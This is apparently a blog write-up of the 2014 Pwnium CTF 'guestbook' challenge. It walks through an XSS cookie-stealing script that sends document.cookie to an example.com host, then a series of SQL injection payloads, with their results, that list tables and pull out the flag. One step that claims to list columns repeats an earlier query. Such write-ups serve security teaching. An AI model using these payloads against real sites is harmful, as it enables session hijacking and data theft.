---
layout: post
title:  "Guestbook - SQL Injection (Pwnium CTF)"
date:   2014-07-19 18:15
categories: writeups
author: Joey Geralnik
tags: sqli
---
This is a writeup of the challenge guestbook from the 2014 Pwnium CTF.

See my [previous post]({% post_url 2014-07-19-2048 %}) for some details about the competition.

This was a relatively simple SQL injection level but there are no writeups available online and I saw some people requesting one.

## The challenge
We are given the url of a [website](http://41.231.53.43:8383/) and told to find the key.

Luckily the website is still up so I was able to recreate my exploit (note to self: take better notes in the future).

## XSS?
The first thing we noticed after logging in to the website and trying to create a post is that the form is vulnerable to xss. If we enter a post with the title:

    <script>alert(document.cookie);</script>

and submit it we will get a popup window.

We can see that there is a cookie called "c" set and that it is accessible through javascript. Trying on another browser, we see that setting "c" is enough to log in as another user.

The next interesting page is the contact page. There we can send a message to the admin that will presumably also be vulnerably to xss. We created a basic cookie stealing exploit - a script that does

    window.location = "http://www.example.com/cookiesteal?" + escape(document.cookie);

sent it to the admin and then waited for the admin to see the message, get redirected to our website, and see his cookie in our server logs.

We waited. And waited.

Eventually we realized that the admin doesn't actually exist and isn't going to be visiting our site.

Time to look for another vulnerability.

## SQLI

Going back to the 'post a comment' page, we see what else we can do (first we should create a new user so we don't have to deal with those alerts from the xss atempt). This time, let's try entering a single quote in the subject

    '

We get an error! Yay! We experiment with quotes and comments to try to enter a valid post. The first one that works is:

Title:

    g', 'h

Content:

    h', 'i') -- 

(Note the space at the end of the line)

This prints out success. We can simplify this and use just the title with:

    abc', 'def', 'ghi') -- 

Which once again works. However, we don't see the post on the page. If the first field is title and the second field is content, we can guess that the third field is the username. That is - the post is being inserted into the database as part of a query of the form `INSERT INTO posts (title, content, user) VALUES (%s, %s, %s);`. My username was xxb - the result of random keyboard mashing. Trying

    abc', 'def', 'xxb') -- 

We again get a success message and this time we can see the post!

## Exploiting

Let's try calling a function instead of the second field:

    abc', version(), 'xxb') -- 
    Result: 5.5.37-0ubuntu0.14.04.1   

A quick google search reveals that 5.5.37 is a mysql version number. Let's try to see what tables the database has:

    abc', (SELECT table_name FROM INFORMATION_SCHEMA.TABLES limit 1), 'xxb') --  
    Result: CHARACTER_SETS

Hmm, not so helpful.

    abc', (SELECT table_name FROM INFORMATION_SCHEMA.TABLES order by
    CREATE_TIME limit 1), 'xxb') --  
    Result: post

Alright!

    abc', (SELECT table_name FROM INFORMATION_SCHEMA.TABLES where
    table_name != 'post' order by CREATE_TIME limit 1), 'xxb') --  
    Result: user
    abc', (SELECT table_name FROM INFORMATION_SCHEMA.TABLES where
    table_name not in ('post', 'user') order by CREATE_TIME limit 1), 'xxb') --  
    Result: flag

Win! I will admit I spent some time examining users and posts and logging in as the admin user before thinking to search for another table.

Now we just need to figure out what columns the table has:

    abc', (SELECT table_name FROM INFORMATION_SCHEMA.TABLES where
    table_name not in ('post', 'user') order by CREATE_TIME limit 1), 'xxb') --  
    Result: flag

Victory?

    abc', (SELECT flag from flag), 'xxb') --  
    Result: Error

Hmm...

    abc', (SELECT flag from flag LIMIT 1), 'xxb') --  
    Result: ''

Last try:

    abc', (SELECT flag from flag where flag != '' LIMIT 1), 'xxb') --  
    Pwnium{a6f33b4062b8bdcf3fe12e024568f67b}

Yay! That's the flag!
